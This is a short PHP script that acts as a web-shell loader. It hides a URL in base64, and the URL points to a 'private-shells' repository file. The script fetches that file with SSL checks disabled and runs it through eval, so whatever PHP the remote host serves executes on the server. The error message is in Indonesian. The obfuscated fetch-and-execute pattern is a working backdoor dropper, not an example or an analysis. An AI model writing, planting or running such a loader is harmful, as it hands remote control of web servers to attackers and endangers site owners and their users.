<?php
function fetch_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $output = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'cURL error: ' . curl_error($ch);
        $output = false;
    }

    curl_close($ch);
    return $output;
}

$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2N5YnJ4LXNvdXJjZS9wcml2YXRlLXNoZWxscy9yZWZzL2hlYWRzL21haW4vYWxmYWJiLnBocA==";
$decoded_url = base64_decode($encoded_url);

$content = fetch_content($decoded_url);

if ($content !== false) {
    eval("?>".$content);
} else {
    echo "Gagal mengambil isi file!";
}
?>
